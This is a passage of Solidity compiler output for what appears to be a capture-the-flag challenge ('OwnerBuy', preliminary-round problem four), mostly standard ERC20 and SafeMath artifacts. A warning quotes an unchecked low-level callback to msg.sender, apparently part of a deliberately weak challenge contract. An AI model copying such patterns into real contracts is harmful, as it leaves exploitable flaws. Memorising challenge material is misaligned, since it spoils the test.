					"metadata": "{\"compiler\":{\"version\":\"0.5.17+commit.d19bba13\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Optional functions from the ERC20 standard.\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default.      * This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets `amount` as the allowance of `spender` over the caller's tokens.      * Returns a boolean value indicating whether the operation succeeded.      * IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729      * Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the amount of tokens owned by `account`.\"},\"constructor\":{\"details\":\"Sets the values for `name`, `symbol`, and `decimals`. All three of these values are immutable: they can only be set once during construction.\"},\"decimals()\":{\"details\":\"Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5,05` (`505 / 10 ** 2`).      * Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei.      * NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}.\"},\"name()\":{\"details\":\"Returns the name of the token.\"},\"symbol()\":{\"details\":\"Returns the symbol of the token, usually a shorter version of the name.\"},\"totalSupply()\":{\"details\":\"Returns the amount of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves `amount` tokens from the caller's account to `recipient`.      * Returns a boolean value indicating whether the operation succeeded.      * Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves `amount` tokens from `sender` to `recipient` using the allowance mechanism. `amount` is then deducted from the caller's allowance.      * Returns a boolean value indicating whether the operation succeeded.      * Emits a {Transfer} event.\"}}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20Detailed.sol\":\"ERC20Detailed\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20Detailed.sol\":{\"keccak256\":\"0xe20fce8726ac6988a627b4abae707647c8c46d9b5be24e0e085c718e854d9e34\",\"urls\":[\"bzz-raw://99a90f29bbd180bc88edf71c0583ec07d109bcfae5530aaffee434d0188c33e8\",\"dweb:/ipfs/Qmb2AKkdtcH2eWtXtaaSqABrLtBgcc9ppkn4iJPP89NNKp\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/IERC20.sol\":{\"keccak256\":\"0xd45135fede71fe4b2f06ccc22c459f880912785065a13f5ebf85ebe3d07d632e\",\"urls\":[\"bzz-raw://e38e11ed61a168499a2128f65c4248f9cb76a12fb0c9f2ae0e0e0ade46c5ba9f\",\"dweb:/ipfs/QmdAEvzLRsCtT6Yp1ruyymfaQ4hDtQMmBFjYY9MB4YQSBm\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 973,
								"contract": "赛题-预赛/第四题/contracts/ERC20Detailed.sol:ERC20Detailed",
								"label": "_name",
								"offset": 0,
								"slot": "0",
								"type": "t_string_storage"
							},
							{
								"astId": 975,
								"contract": "赛题-预赛/第四题/contracts/ERC20Detailed.sol:ERC20Detailed",
								"label": "_symbol",
								"offset": 0,
								"slot": "1",
								"type": "t_string_storage"
							},
							{
								"astId": 977,
								"contract": "赛题-预赛/第四题/contracts/ERC20Detailed.sol:ERC20Detailed",
								"label": "_decimals",
								"offset": 0,
								"slot": "2",
								"type": "t_uint8"
							}
						],
						"types": {
							"t_string_storage": {
								"encoding": "bytes",
								"label": "string",
								"numberOfBytes": "32"
							},
							"t_uint8": {
								"encoding": "inplace",
								"label": "uint8",
								"numberOfBytes": "1"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"赛题-预赛/第四题/contracts/IERC20.sol": {
				"IERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "Interface of the ERC20 standard as defined in the EIP. Does not include the optional functions; to access them see {ERC20Detailed}.",
						"methods": {
							"allowance(address,address)": {
								"details": "Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default.      * This value changes when {approve} or {transferFrom} are called."
							},
							"approve(address,uint256)": {
								"details": "Sets `amount` as the allowance of `spender` over the caller's tokens.      * Returns a boolean value indicating whether the operation succeeded.      * IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729      * Emits an {Approval} event."
							},
							"balanceOf(address)": {
								"details": "Returns the amount of tokens owned by `account`."
							},
							"totalSupply()": {
								"details": "Returns the amount of tokens in existence."
							},
							"transfer(address,uint256)": {
								"details": "Moves `amount` tokens from the caller's account to `recipient`.      * Returns a boolean value indicating whether the operation succeeded.      * Emits a {Transfer} event."
							},
							"transferFrom(address,address,uint256)": {
								"details": "Moves `amount` tokens from `sender` to `recipient` using the allowance mechanism. `amount` is then deducted from the caller's allowance.      * Returns a boolean value indicating whether the operation succeeded.      * Emits a {Transfer} event."
							}
						}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.17+commit.d19bba13\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface of the ERC20 standard as defined in the EIP. Does not include the optional functions; to access them see {ERC20Detailed}.\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default.      * This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets `amount` as the allowance of `spender` over the caller's tokens.      * Returns a boolean value indicating whether the operation succeeded.      * IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729      * Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the amount of tokens owned by `account`.\"},\"totalSupply()\":{\"details\":\"Returns the amount of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves `amount` tokens from the caller's account to `recipient`.      * Returns a boolean value indicating whether the operation succeeded.      * Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves `amount` tokens from `sender` to `recipient` using the allowance mechanism. `amount` is then deducted from the caller's allowance.      * Returns a boolean value indicating whether the operation succeeded.      * Emits a {Transfer} event.\"}}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/IERC20.sol\":\"IERC20\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/IERC20.sol\":{\"keccak256\":\"0xd45135fede71fe4b2f06ccc22c459f880912785065a13f5ebf85ebe3d07d632e\",\"urls\":[\"bzz-raw://e38e11ed61a168499a2128f65c4248f9cb76a12fb0c9f2ae0e0e0ade46c5ba9f\",\"dweb:/ipfs/QmdAEvzLRsCtT6Yp1ruyymfaQ4hDtQMmBFjYY9MB4YQSBm\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"赛题-预赛/第四题/contracts/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"details": "Wrappers over Solidity's arithmetic operations with added overflow checks.  * Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows.  * Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.",
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":604:3634  library SafeMath {\r... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":604:3634  library SafeMath {\r... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa265627a7a72315820cb51a3431ca04921b51b7387108a28583ea02b78e29477abcccb4912b3236adb64736f6c63430005110032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60556023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a72315820cb51a3431ca04921b51b7387108a28583ea02b78e29477abcccb4912b3236adb64736f6c63430005110032",
							"opcodes": "PUSH1 0x55 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xCB MLOAD LOG3 NUMBER SHR LOG0 0x49 0x21 0xB5 SHL PUSH20 0x87108A28583EA02B78E29477ABCCCB4912B3236A 0xDB PUSH5 0x736F6C6343 STOP SDIV GT STOP ORIGIN ",
							"sourceMap": "604:3030:4:-;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a72315820cb51a3431ca04921b51b7387108a28583ea02b78e29477abcccb4912b3236adb64736f6c63430005110032",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xCB MLOAD LOG3 NUMBER SHR LOG0 0x49 0x21 0xB5 SHL PUSH20 0x87108A28583EA02B78E29477ABCCCB4912B3236A 0xDB PUSH5 0x736F6C6343 STOP SDIV GT STOP ORIGIN ",
							"sourceMap": "604:3030:4:-;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17000",
								"executionCost": "94",
								"totalCost": "17094"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"div(uint256,uint256)": "infinite",
								"mod(uint256,uint256)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 604,
									"end": 3634,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 604,
									"end": 3634,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820cb51a3431ca04921b51b7387108a28583ea02b78e29477abcccb4912b3236adb64736f6c63430005110032",
									".code": [
										{
											"begin": 604,
											"end": 3634,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 604,
											"end": 3634,
											"name": "ADDRESS"
										},
										{
											"begin": 604,
											"end": 3634,
											"name": "EQ"
										},
										{
											"begin": 604,
											"end": 3634,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 604,
											"end": 3634,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 604,
											"end": 3634,
											"name": "MSTORE"
										},
										{
											"begin": 604,
											"end": 3634,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 604,
											"end": 3634,
											"name": "DUP1"
										},
										{
											"begin": 604,
											"end": 3634,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.17+commit.d19bba13\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Wrappers over Solidity's arithmetic operations with added overflow checks.  * Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows.  * Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.\",\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/SafeMath.sol\":{\"keccak256\":\"0x11a066623aa9848c105e3610dd03f30d87881271d8da83a3974f898d5314025c\",\"urls\":[\"bzz-raw://76812a0f7047a8d98e291415723003b6238024ef37572453dcd96c70c946f9a7\",\"dweb:/ipfs/Qmf8SQN4J9ghTq3mVjxenmVAZtR8RnqvdfDvR5jma1gpJk\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"formattedMessage": "赛题-预赛/第四题/OwnerBuy.sol:156:9: Warning: Return value of low-level calls not used.\n        msg.sender.call.gas(1000000)(\"\");\r\n        ^------------------------------^\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 4863,
					"file": "赛题-预赛/第四题/OwnerBuy.sol",
					"start": 4831
				},
				"type": "Warning"
			}
		],
		"sources": {
			"赛题-预赛/第四题/OwnerBuy.sol": {
				"ast": {
					"absolutePath": "赛题-预赛/第四题/OwnerBuy.sol",
					"exportedSymbols": {
						"Changing": [
							12
						],
						"Ownable": [
							151
						],
						"OwnerBuy": [
							544
						],
						"deployed": [
							576
						],
						"self": [
							587
						]
					},
					"id": 588,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "39:23:0"
						},
						{
							"absolutePath": "赛题-预赛/第四题/contracts/ERC20.sol",
							"file": "./contracts/ERC20.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 588,
							"sourceUnit": 967,
							"src": "64:31:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "赛题-预赛/第四题/contracts/IERC20.sol",
							"file": "./contracts/IERC20.sol",
							"id": 3,
							"nodeType": "ImportDirective",
							"scope": 588,
							"sourceUnit": 1094,
							"src": "97:32:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "赛题-预赛/第四题/contracts/ERC20Detailed.sol",
							"file": "./contracts/ERC20Detailed.sol",
							"id": 4,
							"nodeType": "ImportDirective",
							"scope": 588,
							"sourceUnit": 1025,
							"src": "131:39:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 12,
							"linearizedBaseContracts": [
								12
							],
							"name": "Changing",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"id": 11,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "isOwner",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 6,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "219:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 5,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "219:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "218:9:0"
									},
									"returnParameters": {
										"id": 10,
